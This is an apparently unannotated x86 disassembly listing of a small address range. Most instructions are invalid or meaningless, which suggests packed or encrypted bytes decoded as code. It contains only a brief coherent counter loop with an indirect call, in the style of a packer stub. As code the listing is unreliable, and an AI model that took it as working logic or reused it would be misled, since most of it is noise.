  4121c0:	(bad)  [edi-0x6b78de24]
  4121c6:	and    dh,al
  4121c8:	test   eax,0x6fa22058
  4121cd:	retf   0xca3a
  4121d0:	pushf  
  4121d1:	jmp    0xa73d:0x231ce6c1
  4121d8:	imul   BYTE PTR [esi]
  4121da:	dec    ecx
  4121db:	sbb    al,0x2c
  4121dd:	pop    esp
  4121de:	xchg   esp,eax
  4121df:	(bad)  [edi-0x23]
  4121e2:	add    DWORD PTR [edi],ecx
  4121e4:	dec    esi
  4121e5:	xchg   ecx,eax
  4121e6:	xchg   esi,eax
  4121e7:	sub    BYTE PTR [ebp-0x55],0x3e
  4121eb:	loope  0x412208
  4121ed:	sti    
  4121ee:	dec    ebp
  4121ef:	cmp    al,0x9b
  4121f1:	jns    0x412182
  4121f3:	mov    cl,0x95
  4121f5:	ror    DWORD PTR [eax-0x3d646c9b],1
  4121fb:	push   ebx
  4121fc:	mov    ebx,0xaf18ce6f
  412201:	jp     0x4121de
  412203:	ret    
  412204:	dec    edx
  412205:	ds enter 0xe5ac,0xc0
  41220a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41220b:	out    dx,eax
  41220c:	push   esi
  41220d:	xor    BYTE PTR [eax],al
  41220f:	imul   ebx,DWORD PTR [edi+0x1d5b090e],0x6e
  412216:	xor    DWORD PTR [ecx-0xa],edi
  412219:	cs pop ebp
  41221b:	jno    0x412280
  41221d:	mov    dh,0x42
  41221f:	inc    esi
  412220:	xchg   edi,eax
  412221:	cmp    esi,ebp
  412223:	pop    ss
  412224:	pop    eax
  412225:	call   DWORD PTR [ecx+0x39d9b76f]
  41222b:	lods   al,BYTE PTR ds:[esi]
  41222c:	test   BYTE PTR [eax],dl
  41222e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41222f:	pusha  
  412230:	lods   al,BYTE PTR ds:[esi]
  412231:	adc    al,0xaf
  412233:	sub    eax,0xee5a89a4
  412238:	xor    BYTE PTR [eax],ah
  41223a:	test   eax,0xe420242c
  41223f:	mov    esi,0x5223fd9f
  412244:	inc    ebp
  412245:	mov    cs,WORD PTR [esi+0x2e]
  412248:	int3   
  412249:	mov    gs,WORD PTR [ebp+0x634de0b3]
  41224f:	sub    BYTE PTR [eax-0x56e67d12],al
  412255:	jo     0x4121dd
  412257:	fisub  WORD PTR [eax+0x5f]
  41225a:	cmp    al,0xd3
  41225c:	push   0x3a
  41225e:	inc    ebp
  41225f:	js     0x412232
  412261:	push   ds
  412262:	pusha  
  412263:	ror    BYTE PTR [ebx],1
  412265:	cli    
  412266:	inc    ebp
  412267:	ds inc ebp
  412269:	gs pop esp
  41226b:	jg     0x41220d
  41226d:	outs   dx,DWORD PTR ds:[esi]
  41226e:	fisubr WORD PTR [edx+0x5f]
  412271:	or     bl,bh
  412273:	gs dec ecx
  412275:	pop    esp
  412276:	lods   al,BYTE PTR ds:[esi]
  412277:	or     al,0xf2
  412279:	mov    eax,DWORD PTR [ecx+0xd]
  41227c:	add    eax,0x1a338718
  412281:	inc    ebp
  412282:	add    eax,ebp
  412284:	inc    esi
  412285:	jmp    0xebf5:0xa70b7378
  41228c:	fwait
  41228d:	mov    BYTE PTR [edx-0x12],0xce
  412291:	inc    ecx
  412292:	in     al,0xe1
  412294:	ds jg  0x412295
  412297:	xchg   edi,eax
  412298:	in     eax,0x2f
  41229a:	aad    0xd9
  41229c:	mov    esi,edx
  41229e:	mov    cl,0x65
  4122a0:	cmp    al,0xf7
  4122a2:	xor    al,0x18
  4122a4:	mov    ecx,0x7fb8f06f
  4122a9:	add    al,0xa7
  4122ab:	(bad)  
  4122ac:	in     al,0x8f
  4122ae:	or     eax,0xa41327b5
  4122b3:	xchg   esi,eax
  4122b4:	push   eax
  4122b5:	cmp    DWORD PTR [esi+0x47c2e83a],ebx
  4122bb:	dec    esp
  4122bc:	mov    ch,0xab
  4122be:	ffree  st(0)
  4122c0:	push   ecx
  4122c1:	mov    edx,0x71ef0029
  4122c6:	xor    eax,esp
  4122c8:	stc    
  4122c9:	mov    al,0xd8
  4122cb:	mov    ecx,0x3e721c89
  4122d0:	jns    0x412335
  4122d2:	jnp    0x4122da
  4122d4:	mul    BYTE PTR [edi-0x28]
  4122d7:	and    al,BYTE PTR ds:0x61b61f5f
  4122dd:	cdq    
  4122de:	or     DWORD PTR [eax],edi
  4122e0:	loopne 0x4122eb
  4122e2:	mov    dh,0xcd
  4122e4:	or     al,0x2e
  4122e6:	bound  edi,QWORD PTR [esi+0x5f]
  4122e9:	daa    
  4122ea:	inc    esi
  4122eb:	mov    al,0x4b
  4122ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122ee:	(bad)  
  4122ef:	test   al,0x7b
  4122f1:	cmovns edx,DWORD PTR [esi+eax*2-0x2341ec41]
  4122f9:	xor    eax,esi
  4122fb:	jbe    0x4122b5
  4122fd:	xchg   DWORD PTR [eax-0x4fe5547b],esi
  412303:	data16 daa 
  412305:	add    cl,ch
  412307:	xor    dh,BYTE PTR [edi]
  412309:	cmp    al,0x26
  41230b:	leave  
  41230c:	or     esp,DWORD PTR [esi-0x708f6044]
  412312:	adc    eax,0xacab00fb
  412317:	pop    esp
  412318:	hlt    
  412319:	mov    dh,0x6
  41231b:	inc    edi
  41231c:	pusha  
  41231d:	aad    0xd3
  41231f:	sub    ch,cl
  412321:	cmp    ecx,esp
  412323:	push   eax
  412324:	xor    edx,ecx
  412326:	pop    ecx
  412327:	lds    ebp,FWORD PTR gs:[edi+0x29]
  41232b:	mov    esi,0x1d97a656
  412330:	retf   
  412331:	push   ss
  412332:	mov    ah,BYTE PTR [ebp+0x5e690f2d]
  412338:	addr16 imul edx,esp,0xfffffff7
  41233c:	xchg   ebx,eax
  41233d:	sub    BYTE PTR [eax],bh
  41233f:	push   esi
  412340:	outs   dx,DWORD PTR ds:[esi]
  412341:	mov    esi,0x9f59ece3
  412346:	iret   
  412347:	ja     0x412329
  412349:	psraw  mm2,QWORD PTR [esi-0x13]
  41234d:	adc    eax,esp
  41234f:	dec    ecx
  412350:	aam    0x1e
  412352:	mov    bl,0x3b
  412354:	aas    
  412355:	mov    al,0x3d
  412357:	mov    DWORD PTR [eax+ecx*4-0x54],edi
  41235b:	dec    ebx
  41235c:	xchg   DWORD PTR [eax-0xff463aa],edx
  412362:	aaa    
  412363:	out    dx,al
  412364:	jno    0x412355
  412366:	inc    eax
  412367:	into   
  412368:	pcmpeqd mm6,QWORD PTR [esi-0x4128922d]
  41236f:	pop    ecx
  412370:	add    DWORD PTR [edx],esp
  412372:	int3   
  412373:	into   
  412374:	inc    ebp
  412375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412376:	adc    eax,0xc236536e
  41237b:	(bad)  
  41237d:	mov    bh,0xaf
  41237f:	jmp    0x4123b5
  412381:	les    ebx,FWORD PTR [ebx-0x751b7a8c]
  412387:	popf   
  412388:	mov    eax,ds:0x411f09a2
  41238d:	out    dx,eax
  41238e:	nop
  41238f:	dec    edi
  412390:	ret    
  412391:	mov    ds:0xd8488a93,eax
  412396:	repnz repnz nop
  412399:	mov    bh,0xfa
  41239b:	popa   
  41239c:	jl     0x412351
  41239e:	into   
  41239f:	sar    BYTE PTR [ecx],1
  4123a1:	out    0x36,eax
  4123a3:	mov    dl,0x4d
  4123a5:	test   al,0xbb
  4123a7:	test   al,ch
  4123a9:	add    eax,0xb2f039fc
  4123ae:	jge    0x412356
  4123b0:	lea    edi,[ebp-0x3]
  4123b3:	xchg   esi,eax
  4123b4:	enter  0x81a4,0x84
  4123b8:	ret    0xbfd0
  4123bb:	(bad)  
  4123bc:	fimul  WORD PTR [esi-0x47]
  4123bf:	stos   BYTE PTR es:[edi],al
  4123c0:	sub    esi,ecx
  4123c2:	and    BYTE PTR [bp-0x3a],dl
  4123c6:	mov    bh,0x3
  4123c8:	lods   al,BYTE PTR ds:[esi]
  4123c9:	ins    DWORD PTR es:[edi],dx
  4123ca:	hlt    
  4123cb:	cmp    al,0x3b
  4123ce:	adc    ebp,0x3fc390c
  4123d4:	cmp    edx,edx
  4123d6:	loop   0x412439
  4123d8:	jb     0x412438
  4123da:	mov    dl,0x1d
  4123dc:	inc    esp
  4123dd:	inc    esi
  4123de:	outs   dx,DWORD PTR ds:[esi]
  4123df:	sbb    DWORD PTR ds:0x9c254359,ebx
  4123e5:	and    DWORD PTR [edx+0x50f080f6],edx
  4123eb:	jecxz  0x41242f
  4123ed:	fdivrp st(6),st
  4123ef:	mov    DWORD PTR [edi-0x6b2cd543],esp
  4123f5:	loopne 0x412425
  4123f7:	mov    esp,0xd75ee9af
  4123fc:	fdivr  QWORD PTR [eax-0x6b422585]
  412402:	xchg   esp,eax
  412403:	pop    ebx
  412404:	inc    esp
  412405:	retf   0x3b71
  412408:	dec    ebp
  412409:	sbb    eax,0xeaec411f
  41240e:	lea    esp,[eax+0x422c9868]
  412414:	push   es
  412415:	dec    esp
  412416:	ficomp WORD PTR [edx-0x4a99296c]
  41241c:	inc    ebp
  41241d:	fstp   QWORD PTR [ebx+0x3c]
  412420:	cli    
  412421:	sub    eax,0x9f092b88
  412426:	xchg   ebx,eax
  412427:	adc    eax,0x855b60e6
  41242c:	mov    ebx,0x3aa89115
  412431:	nop
  412432:	out    0x43,eax
  412434:	mov    bl,0xcc
  412436:	or     eax,0xddeee6ec
  41243b:	dec    ebx
  41243d:	fs jb  0x4123dd
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	mov    dh,0xf3
  41245f:	cmp    eax,DWORD PTR [edi-0x71]
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xdc70707e
  41246a:	push   ecx
  41246b:	sbb    al,BYTE PTR [eax+0x5c185b42]
  412471:	add    al,0x3
  412473:	fisubr DWORD PTR [eax+ebp*4+0x3f94df10]
  41247a:	ins    BYTE PTR es:[edi],dx
  41247b:	in     eax,dx
  41247c:	mov    al,ds:0xff51981
  412481:	inc    ecx
  412482:	bound  edx,QWORD PTR [edx]
  412484:	push   ds
  412485:	test   DWORD PTR [ebp+eiz*4-0x4153a4f0],esp
  41248c:	cmc    
  41248d:	fisubr WORD PTR [ecx]
  41248f:	mov    edx,0xaf1f7f63
  412494:	mov    ch,0x3
  412496:	ins    DWORD PTR es:[edi],dx
  412497:	lock inc esp
  412499:	fwait
  41249a:	(bad)
  41249d:	jns    0x4124fb
  41249f:	(bad)  
  4124a0:	mov    edx,0x40aa55db
  4124a5:	jge    0x412513
  4124a7:	mov    ds:0x156177de,eax
  4124ac:	pushf  
  4124ad:	scas   al,BYTE PTR es:[edi]
  4124ae:	clc    
  4124af:	adc    DWORD PTR [edi-0x50],ebx
  4124b2:	mov    eax,0xaa501280
  4124b7:	mov    DWORD PTR [esi+0x5127ac8e],ebx
  4124bd:	mov    esi,0xc8fa22d2
  4124c2:	push   ss
  4124c3:	pop    ecx
  4124c4:	rcl    BYTE PTR es:[ecx+eax*1-0x6b],1
  4124c9:	sbb    ch,BYTE PTR [edx-0x7d]
  4124cc:	xchg   ebx,eax
  4124cd:	xor    BYTE PTR [edx],cl
  4124cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124d0:	cmp    eax,0x5b996cd4
  4124d5:	mov    ds:0x3b46199e,eax
  4124da:	adc    al,0x5a
  4124dc:	mul    BYTE PTR fs:[eax+0x2388070]
  4124e3:	jb     0x41246a
  4124e5:	jae    0x41254e
  4124e7:	dec    edi
  4124e8:	pop    eax
  4124e9:	enter  0xf8fa,0x26
  4124ed:	add    BYTE PTR [edx],ch
  4124ef:	xor    esi,DWORD PTR [esi-0x7d5dae56]
  4124f5:	lahf   
  4124f6:	push   ebx
  4124f7:	inc    edx
  4124f8:	nop
  4124f9:	mov    ebp,ecx
  4124fb:	cmp    DWORD PTR [esi-0xeebd21],eax
  412501:	and    dh,al
  412503:	ins    BYTE PTR es:[edi],dx
  412504:	cmp    bl,dh
  412506:	(bad)  [ecx+0x40]
  412509:	jmp    0x44afc4c5
  41250e:	sbb    bh,bh
  412510:	or     DWORD PTR [edi-0x7255bcbc],0x4d
  412517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412518:	sar    ch,cl
  41251a:	jno    0x4124ce
  41251c:	xchg   edi,eax
  41251d:	cmp    esp,eax
  41251f:	pop    ss
  412520:	inc    eax
  412521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412522:	or     BYTE PTR [ebx-0x6b],al
  412525:	sub    al,0x57
  412527:	jne    0x412534
  412529:	aad    0x90
  41252b:	mov    bh,0xff
  41252d:	or     esi,DWORD PTR [ebx]
  41252f:	aad    0x6d
  412531:	add    bl,0x95
  412534:	inc    esp
  412535:	push   es
  412536:	pop    esi
  412537:	stos   DWORD PTR es:[edi],eax
  412538:	test   DWORD PTR [ecx+0x120d7359],eax
  41253e:	enter  0xa8a3,0x1b
  412542:	pop    esi
  412543:	cmc    
  412544:	inc    esp
  412545:	cmp    edi,DWORD PTR [edi+0x72f85de2]
  41254b:	test   BYTE PTR [ecx],ah
  41254d:	mov    al,ds:0x6772cbfe
  412552:	gs mov ebx,0x7b33cd4f
  412558:	call   0xc7c83bad
  41255d:	dec    esi
  41255e:	pushf  
  41255f:	rol    DWORD PTR [ecx+0x51ba2372],cl
  412565:	call   0xa36b2bfc
  41256a:	or     al,0x68
  41256c:	pop    ebx
  41256d:	dec    esp
  41256e:	lahf   
  41256f:	mov    al,0x3
  412571:	fsub   QWORD PTR [edx+eax*4-0x3b]
  412575:	push   esp
  412576:	mov    ah,0x9a
  412578:	lods   al,BYTE PTR ds:[esi]
  412579:	in     al,0x22
  41257b:	jbe    0x4125b6
  41257d:	jg     0x412553
  41257f:	call   0x1643:0x959e6d18
  412586:	xor    ebp,DWORD PTR [edi+0x550ab607]
  41258c:	or     DWORD PTR [esp+ebp*1],edx
  41258f:	out    dx,al
  412590:	sbb    BYTE PTR [eax+0x706ca268],dh
  412596:	call   0xc885:0x82f11f10
  41259d:	adc    edi,DWORD PTR [edx]
  41259f:	add    ecx,DWORD PTR [ecx+ebx*8-0x3d]
  4125a3:	or     esp,ecx
  4125a5:	enter  0xa6ff,0x3b
  4125a9:	js     0x4125e1
  4125ab:	mov    ds:0xfb1f0d02,al
  4125b0:	test   BYTE PTR [ebp+0x55213e2f],al
  4125b6:	add    BYTE PTR [ebp+0x52],bl
  4125b9:	xchg   edx,eax
  4125ba:	pop    ds
  4125bb:	adc    al,0x9e
  4125bd:	lock jle 0x4125b9
  4125c0:	mov    edx,0x53d319db
  4125c5:	or     BYTE PTR [eax+0x61],ch
  4125c8:	or     al,BYTE PTR [eax-0x37]
  4125cb:	xor    eax,DWORD PTR ds:0xaa16bac5
  4125d1:	push   edi
  4125d3:	cmp    BYTE PTR [edx-0x14],bh
  4125d6:	enter  0x2ad9,0xca
  4125da:	sub    DWORD PTR [ecx+esi*1-0x4f],edi
  4125de:	popa   
  4125df:	xchg   esp,eax
  4125e0:	xor    BYTE PTR [ebx+0x55eda17d],cl
  4125e6:	mov    edx,0xa9d8c3bd
  4125eb:	cmc    
  4125ec:	sahf   
  4125ed:	sub    eax,0x8eb2b5fa
  4125f2:	fs call 0x600e:0xe0db235f
  4125fa:	dec    eax
  4125fb:	ss fdivr st(2),st
  4125fe:	enter  0x7579,0xb5
  412602:	or     al,0x2e
  412604:	mov    al,dh
  412606:	scas   eax,DWORD PTR es:[edi]
  412607:	xchg   edx,eax
  412608:	mov    ebx,0x685a693c
  41260d:	inc    ebp
  41260e:	push   ds
  41260f:	int    0x2a
  412611:	gs dec edx
  412613:	cwde   
  412614:	add    BYTE PTR [ecx-0x5b],0xda
  412618:	shr    al,1
  41261a:	jno    0x4125f9
  41261c:	adc    ebp,DWORD PTR [edx+0x6d3b50ad]
  412622:	pop    ebp
  412623:	pusha  
  412624:	cdq    
  412625:	test   DWORD PTR [edi],edi
  412627:	push   ebp
  412628:	fsubr  DWORD PTR [edi+0x64]
  41262b:	and    BYTE PTR [eax-0x6cc7cc5c],0xab
  412632:	icebp  
  412633:	inc    ecx
  412634:	inc    ebp
  412635:	outs   dx,DWORD PTR ds:[esi]
  412636:	lds    edi,FWORD PTR [esi-0x57]
  412639:	outs   dx,BYTE PTR ds:[esi]
  41263a:	dec    ecx
  41263b:	mov    dl,0x34
  41263d:	or     edx,DWORD PTR [ecx]
  41263f:	pop    ss
  412640:	stos   DWORD PTR es:[edi],eax
  412641:	js     0x4125c6
  412643:	sub    BYTE PTR [ebx-0x33],bh
  412646:	lahf   
  412647:	mov    cl,BYTE PTR [ebx]
  412649:	pop    ecx
  41264a:	cmp    al,0x57
  41264c:	arpl   WORD PTR [edi],cx
  41264e:	jge    0x412693
  412650:	cs jne 0x4125eb
  412653:	test   eax,0x71b93004
  412658:	aaa    
  412659:	adc    edx,edi
  41265b:	pop    ebp
  41265c:	js     0x4125f0
  41265e:	adc    edx,DWORD PTR [esi-0x530846d7]
  412664:	fwait
  412665:	dec    esi
  412666:	mul    DWORD PTR [edi]
  412668:	xor    DWORD PTR [eax-0x1c],esi
  41266b:	cmc    
  41266c:	dec    bh
  41266e:	int3   
  41266f:	dec    ebp
  412670:	push   es
  412671:	mov    edi,0x280f291e
  412676:	dec    ecx
  412677:	into   
  412678:	jg     0x41267a
  41267a:	repnz fwait
  41267c:	test   eax,0x24d4b00
  412681:	movntps XMMWORD PTR ds:[eax-0x3a1ea25f],xmm4
  412689:	and    bh,BYTE PTR [ebp-0x3b530d7d]
  41268f:	mov    ch,al
  412691:	call   0x9433:0xe554eac4
  412698:	es inc edx
  41269a:	data16 sbb al,BYTE PTR [ecx+0x3369fd63]
  4126a1:	jno    0x4126c2
  4126a3:	pop    edi
  4126a4:	imul   ebx,ebp,0xffffff83
  4126a7:	xlat   BYTE PTR ds:[ebx]
  4126a8:	push   0x16
  4126aa:	aaa    
  4126ab:	cmp    ch,BYTE PTR [edi+0x4b78305c]
  4126b1:	cmp    edi,DWORD PTR [esi+0xa269e4d]
  4126b7:	test   esp,edi
  4126b9:	scas   al,BYTE PTR es:[edi]
  4126ba:	mov    ah,BYTE PTR [ebx-0x66]
  4126bd:	bnd jmp 0x77a61eed
  4126c3:	ins    DWORD PTR es:[edi],dx
  4126c4:	repnz mov edx,0xb3ed6d67
  4126ca:	icebp  
  4126cb:	clc    
  4126cc:	int    0x7c
  4126ce:	addr16 pusha 
  4126d0:	add    BYTE PTR [edx-0x43],0x3
  4126d4:	jns    0x41267e
  4126d6:	mov    ebp,0x20ca203
  4126db:	sbb    DWORD PTR [eax+0xb],eax
  4126de:	mov    esp,0x6761f89e
  4126e3:	lds    ecx,FWORD PTR [edi-0x2235bd90]
  4126e9:	ffree  st(7)
  4126eb:	mov    fs,WORD PTR [ecx+0x0]
  4126ee:	dec    edi
  4126ef:	mov    es,WORD PTR [ecx]
  4126f1:	pop    ebx
  4126f2:	adc    al,0xf
  4126f4:	pop    ecx
  4126f5:	xchg   bl,ah
  4126f7:	adc    al,0xf
  4126f9:	add    ah,0xdb
  4126fc:	lods   eax,DWORD PTR ds:[esi]
  4126fd:	fistp  WORD PTR [esi-0x3a]
  412700:	test   BYTE PTR [ebx+0x348bce81],bl
  412706:	jmp    0x5545:0xeb7cf08d
  41270d:	mov    esi,0x984007dc
  412712:	and    ah,BYTE PTR [edx-0x64]
  412715:	ins    DWORD PTR es:[edi],dx
  412716:	lahf   
  412717:	int    0x83
  412719:	rol    DWORD PTR [ecx],cl
  41271b:	mov    ch,cl
  41271d:	fsub   st,st(0)
  41271f:	sub    eax,0xe53c80fb
  412724:	outs   dx,DWORD PTR ds:[esi]
  412725:	push   ss
  412726:	mov    DWORD PTR [ecx-0x5c],edx
  412729:	mov    eax,0xa98e8dde
  41272e:	mov    dh,0xf9
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esi,eax
  4127be:	push   ss
  4127bf:	jae    0x4127e6
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0xb470707e
  4127ca:	and    ch,BYTE PTR [edx]
  4127cc:	mov    esi,0xde01f427
  4127d1:	xlat   BYTE PTR ds:[ebx]
  4127d2:	ins    DWORD PTR es:[edi],dx
  4127d3:	gs popf 
  4127d5:	add    edi,edi
  4127d7:	jge    0x412803
  4127d9:	sbb    esi,esi
  4127db:	xor    DWORD PTR ds:0x5f85c15e,ecx
  4127e1:	or     bl,BYTE PTR [edi]
  4127e3:	mov    al,0x2b
  4127e5:	push   ecx
  4127e6:	mov    ah,BYTE PTR ds:0x73394e42
  4127ec:	sub    esi,DWORD PTR [esp+ecx*8-0x2b]
  4127f0:	or     eax,DWORD PTR ds:0x36d2e194
  4127f6:	jno    0x4127d7
  4127f8:	jecxz  0x4127c8
  4127fa:	inc    eax
  4127fb:	stc    
  4127fc:	and    bh,bh
  4127fe:	push   esp
  4127ff:	aaa    
  412800:	cli    
  412801:	and    eax,0x3c58baf7
  412806:	(bad)  
  412807:	(bad)  
  412809:	push   ebp
  41280a:	mov    WORD PTR [esi+0x1f849ebe],ds
  412810:	sbb    eax,0xa3d1958
  412815:	rcr    BYTE PTR [edi-0x2c],1
  412818:	sub    al,0x1b
  41281a:	inc    ebp
  41281b:	adc    al,0x6e
  41281d:	outs   dx,DWORD PTR ds:[esi]
  41281e:	inc    ecx
  41281f:	js     0x412843
  412821:	mov    esp,0x945ce22
  412826:	clc    
  412827:	aam    0x8c
  412829:	xor    BYTE PTR [esi+0x7971e2a7],dh
  41282f:	imul   eax,ecx,0xa7741062
  412835:	inc    ebp
  412836:	sti    
  412837:	sahf   
  412838:	cmp    bl,BYTE PTR [edi+0x2dded40f]
  41283e:	or     ecx,0x901d11
  412844:	out    0x0,al
  412846:	cli    
  412847:	xor    esi,DWORD PTR ds:[edi-0x74fb466f]
  41284e:	xchg   esi,eax
  41284f:	arpl   WORD PTR [ebp-0x7f],ax
  412852:	inc    edi
  412853:	out    dx,al
  412854:	or     al,0x2a
  412856:	jo     0x4128b4
  412858:	add    cl,BYTE PTR ds:0x731f4b9f
  41285e:	sub    bl,ah
  412860:	push   eax
  412861:	fstp   TBYTE PTR [eax]
  412863:	mov    ebp,0xc5afa4f8
  412868:	rcl    ah,1
  41286a:	push   0xffffffd7
  41286c:	fisub  WORD PTR es:0xe6768ada
  412873:	ror    BYTE PTR [ebp+0x3],0x89
  412877:	nop
  412878:	fldenv ss:[edx+ecx*8]
  41287c:	add    BYTE PTR [edx],ah
  41287e:	mov    al,ds:0x13f9ee15
  412883:	xor    BYTE PTR [edx+0x4eaedb8a],dh
  412889:	loop   0x41286b
  41288b:	pop    ebx
  41288c:	mov    bh,0xdd
  41288e:	mov    ch,0x21
  412890:	(bad)  
  412891:	adc    al,ah
  412893:	(bad)  
  412894:	jge    0x412896
  412896:	imul   ebp,DWORD PTR [ebx+0x40],0xa828c720
  41289d:	gs (bad) 
  41289f:	daa    
  4128a0:	nop
  4128a1:	daa    
  4128a2:	setb   BYTE PTR [eax+0x27]
  4128a6:	fsubr  st,st(5)
  4128a8:	sahf   
  4128a9:	add    bl,dh
  4128ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ac:	(bad)  
  4128ad:	into   
  4128ae:	pop    ebx
  4128af:	iret   
  4128b0:	popf   
  4128b1:	jmp    0xbba8:0xe5c9afaa
  4128b8:	inc    ebp
  4128b9:	adc    DWORD PTR [ecx+0x5],ebp
  4128bc:	lock aas 
  4128be:	xlat   BYTE PTR ds:[ebx]
  4128bf:	or     eax,0xe4fe3f50
  4128c4:	repz mov dh,BYTE PTR [edx-0x7e]
  4128c8:	sahf   
  4128c9:	out    dx,eax
  4128ca:	pop    edi
  4128cb:	fidivr DWORD PTR [edi-0x7d6763e6]
  4128d1:	sbb    eax,0x930ae977
  4128d6:	lock in al,dx
  4128d8:	enter  0x566e,0xf0
  4128dc:	cmp    eax,0xdb8a348f
  4128e1:	or     eax,0xb72c75d6
  4128e6:	dec    edi
  4128e7:	dec    esp
  4128e8:	jecxz  0x41293f
  4128ea:	js     0x412943
  4128ec:	(bad)  
  4128ed:	call   0xb7d1:0x918ef557
  4128f4:	and    dh,BYTE PTR ds:0xd99e2415
  4128fa:	icebp  
  4128fb:	out    0x49,eax
  4128fd:	and    DWORD PTR [edi],ebp
  4128ff:	sub    DWORD PTR [ebx-0xc],esi
  412902:	dec    eax
  412903:	popa   
  412904:	stos   DWORD PTR es:[edi],eax
  412905:	push   cs
  412906:	inc    esi
  412907:	dec    ecx
  412908:	xchg   ecx,eax
  412909:	or     BYTE PTR [eax+0x18838c57],cl
  41290f:	xchg   edx,esi
  412911:	repz loopne 0x4128d5
  412914:	and    ebp,ecx
  412916:	fcomp  st(3)
  412918:	arpl   WORD PTR [edi],di
  41291a:	ins    DWORD PTR es:[edi],dx
  41291b:	outs   dx,BYTE PTR ds:[esi]
  41291c:	cmp    eax,0x7a5e09dd
  412921:	adc    BYTE PTR [ebp+0x65fdb92a],bh
  412927:	std    
  412928:	mov    edi,0x60fdfd1c
  41292d:	mov    bh,0x30
  41292f:	ss cli 
  412931:	and    bl,BYTE PTR [esi+0x6b8b85a5]
  412937:	idiv   BYTE PTR [ebx+0x2fc235d8]
  41293d:	les    ebp,FWORD PTR [esi]
  41293f:	mov    ?,esi
  412941:	sbb    al,BYTE PTR [ebp+edx*2-0x70fa94d]
  412948:	add    al,0xe0
  41294a:	mov    ecx,0x56ff8cb8
  41294f:	stos   DWORD PTR es:[edi],eax
  412950:	ss push esp
  412952:	mov    al,ds:0xbc9249f6
  412957:	xlat   BYTE PTR ds:[ebx]
  412958:	fadd   QWORD PTR [eax+0x12]
  41295b:	jbe    0x41293d
  41295d:	add    DWORD PTR [eax+0x65],ebp
  412960:	pop    eax
  412961:	retf   
  412962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412964:	dec    esp
  412965:	or     BYTE PTR [ecx],dl
  412967:	add    ebp,DWORD PTR [edi]
  412969:	mov    BYTE PTR ds:0xb69cb925,bl
  41296f:	in     al,0xde
  412971:	sub    DWORD PTR [ecx+0x16],esp
  412974:	out    dx,al
  412975:	mov    al,ds:0xc0813682
  41297a:	(bad)  
  41297b:	call   0x3c8a5311
  412980:	sub    eax,0xe3006ff
  412985:	out    dx,eax
  412986:	pop    ebp
  412987:	inc    edi
  412988:	outs   dx,BYTE PTR ds:[esi]
  412989:	scas   eax,DWORD PTR es:[edi]
  41298a:	and    esi,DWORD PTR [esi]
  41298c:	sub    dl,BYTE PTR [ebp-0x64]
  41298f:	add    DWORD PTR [esi+0x5f],eax
  412992:	pushf  
  412993:	mov    dl,0xb0
  412995:	add    al,0x1d
  412997:	(bad)  
  412998:	pop    ebp
  412999:	jecxz  0x412954
  41299b:	(bad)  
  41299c:	loopne 0x4129aa
  41299e:	ror    BYTE PTR [ebx+0x1eeafecb],0xe0
  4129a5:	add    DWORD PTR [esi+0x3d717ddf],ebx
  4129ab:	aaa    
  4129ac:	int3   
  4129ad:	mov    dl,0x9a
  4129af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129b0:	or     dl,dl
  4129b2:	cdq    
  4129b3:	cmc    
  4129b4:	mov    ds:0x4c4805ba,al
  4129b9:	mov    esi,0xe2513ec
  4129be:	fcmovbe st,st(0)
  4129c0:	cmp    BYTE PTR [esi+0x28],dl
  4129c3:	mov    ds:0xb397ed90,eax
  4129c8:	loope  0x4129f3
  4129ca:	test   al,0x70
  4129cc:	adc    eax,DWORD PTR [eax-0x57]
  4129cf:	sbb    eax,0x484e5866
  4129d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129d5:	iret   
  4129d6:	daa    
  4129d7:	and    DWORD PTR ds:0xc60a0229,0x26
  4129de:	xchg   BYTE PTR [ebp+0x44c1a15c],cl
  4129e4:	out    0x98,al
  4129e6:	dec    esp
  4129e7:	sbb    BYTE PTR [esi+ecx*4+0x3011c4f7],dl
  4129ee:	mov    esi,0x8b33dfc0
  4129f3:	cld    
  4129f4:	outs   dx,DWORD PTR ds:[esi]
  4129f5:	xchg   ebx,eax
  4129f6:	inc    ecx
  4129f7:	in     eax,0xf8
